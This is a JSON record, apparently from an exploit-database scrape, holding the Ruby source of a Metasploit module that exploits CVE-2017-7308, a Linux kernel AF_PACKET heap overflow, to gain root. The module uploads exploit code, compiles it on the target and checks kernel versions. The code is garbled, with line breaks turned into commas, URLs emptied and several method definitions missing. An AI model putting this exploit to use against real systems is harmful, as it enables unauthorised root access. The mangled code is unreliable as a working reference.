{
    "text": "vul_name : AF_PACKET packet_set_ring Privilege Escalation ， vul_cve : CVE-2017-7308 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Local ， Rank = GoodRanking ， include Msf : Post : File ， include Msf : Post : Linux : Priv ， include Msf : Post : Linux : System ， include Msf : Post : Linux : Kernel ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => 'AF_PACKET packet_set_ring Privilege Escalation' ,  ， 'Description' => %q{ ， This module exploits a heap-out-of-bounds write in the packet_set_ring ， function in net/packet/af_packet.c ( AF_PACKET ) in the Linux kernel ， to execute code as root ( CVE-2017-7308 ) . ， The bug was initially introduced in 2011 and patched in version 4.10.6 ,  ， potentially affecting a large number of kernels ; however this exploit ， targets only systems using Ubuntu Xenial kernels 4.8.0 < 4.8.0-46 ,  ， including Linux distros based on Ubuntu Xenial , such as Linux Mint. ， The target system must have unprivileged user namespaces enabled and ， two or more CPU cores. ， Bypasses for SMEP , SMAP and KASLR are included. Failed exploitation ， may crash the kernel. ， This module has been tested successfully on Linux Mint 18 ( x86_64 )  ， with kernel versions :  ， 4.8.0-34-generic ;  ， 4.8.0-36-generic ;  ， 4.8.0-39-generic ;  ， 4.8.0-41-generic ;  ， 4.8.0-42-generic ;  ， 4.8.0-44-generic ;  ， 4.8.0-45-generic. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Andrey Konovalov' ,  # Discovery and C exploit ， 'Brendan Coles' # Metasploit ，  ]  ,  ， 'DisclosureDate' => 'Mar 29 2017' ,  ， 'Platform' => [ 'linux' ]  ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'SessionTypes' => [ 'shell' , 'meterpreter' ]  ,  ， 'Targets' => [ 'Auto' , {} ]  ,  ， 'Privileged' => true ,  ， ' ，  [  ，  [ 'EDB' , '41994' ]  ,  ，  [ 'CVE' , '2017-7308' ]  ,  ，  [ 'BID' , '97234' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'DefaultTarget' => 0 )  ， register_options [  ， OptEnum.new ( 'COMPILE' ,  [ true , 'Compile on target' , 'Auto' , %w ( Auto True False )  ]  )  ,  ， OptString.new ( 'WritableDir' ,  [ true , 'A directory where we can write files' , '/tmp' ]  )  ,  ，  ]  ， end ， def base_dir ， datastore [ 'WritableDir' ] .to_s ， end ， print_status \"Writing ' # {path}' (  # {data.size} bytes ) .\" ， write_file path , data ， end ， upload path , data ， cmd_exec \"chmod +x ' # {path}'\" ， end ， upload \" # {path}.c\" , data ， gcc_cmd = \"gcc -o # {path} # {path}.c\" ， gcc_cmd = \"PATH= $ PATH : /usr/bin/ # {gcc_cmd}\" ， end ， output = cmd_exec gcc_cmd ， unless output.blank? ， print_error output ， fail_with Failure : Unknown , \" # {path}.c failed to compile\" ， end ， cmd_exec \"chmod +x # {path}\" ， end ， path = : File.join Msf : Config.data_directory , 'exploits' , 'cve-2017-7308' , file ， fd = : File.open path , 'rb' ， data = fd.read fd.stat.size ， fd.close ， data ， end ， def live_compile? ， vprint_good 'gcc is installed' ， end ， unless datastore [ 'COMPILE' ] .eql? 'Auto' ， fail_with Failure : BadConfig , 'gcc is not installed. Compiling will fail.' ， end ， end ， def check ， version = kernel_release ， unless version = ~ /^4\\.8\\.0- ( 34 | 36 | 39 | 41 | 42 | 44 | 45 ) -generic/ ， vprint_error \"Linux kernel version # {version} is not vulnerable\"",
    "time": "2018.05.18"
}